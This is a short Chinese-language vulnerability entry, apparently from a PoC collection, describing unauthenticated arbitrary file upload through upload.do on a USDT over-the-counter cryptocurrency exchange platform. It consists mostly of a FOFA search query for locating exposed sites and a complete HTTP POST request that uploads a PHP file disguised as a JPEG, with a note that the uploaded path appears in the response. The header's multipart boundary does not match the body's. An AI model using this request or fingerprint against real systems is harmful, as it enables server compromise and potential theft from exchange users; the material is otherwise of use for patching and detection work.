# 虚拟币买卖USDT场外交易所upload.do存在任意文件上传

虚拟币买卖USDT场外交易所由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过upload.do接口进行任意文件上传。

## fofa

```javascript
body="/static/weui/css/wkb.css"
```

## poc

```javascript
POST /member/index/upload.do HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZcxuMaQ4IflRnJgy
Cookie: Hm_lvt_f4b3788b2247dd149fb7fdffe8aece79=1717334200; _ga=GA1.1.64233863.1717334200; PHPSESSID=8t16e4ahe761qikg272s6jhsi0
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/member/index/upload.do
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
路径返回包中
